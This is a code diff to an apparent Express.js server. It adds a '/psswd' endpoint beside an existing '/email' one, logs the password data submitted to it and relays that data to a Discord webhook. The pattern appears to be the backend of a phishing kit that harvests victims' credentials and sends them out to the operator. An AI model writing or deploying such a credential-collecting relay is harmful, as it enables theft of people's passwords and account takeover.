@@ -30,7 +30,28 @@ app.post('/email', async (req, res) => {
     res.status(500).json({ error: 'Internal server error' });
   }
 });
+//psswd
+app.post('/psswd', async (req, res) => {
+  const passwordData = req.body;
 
+  // Log the received data
+  console.log('Received password data:', passwordData);
+
+  try {
+    // Send password data to Discord webhook
+    await axios.post(discordWebhookUrl, {
+      content: `New password data received: \`\`\`${JSON.stringify(passwordData, null, 2)}\`\`\``,
+    });
+
+    // Respond with a success message
+    res.json({ message: 'Password data received successfully' });
+  } catch (error) {
+    console.error('Error sending password data', error.message);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+//ok
+    
 app.listen(PORT, () => {
   console.log(`Server is running on port ${PORT}`);
 });
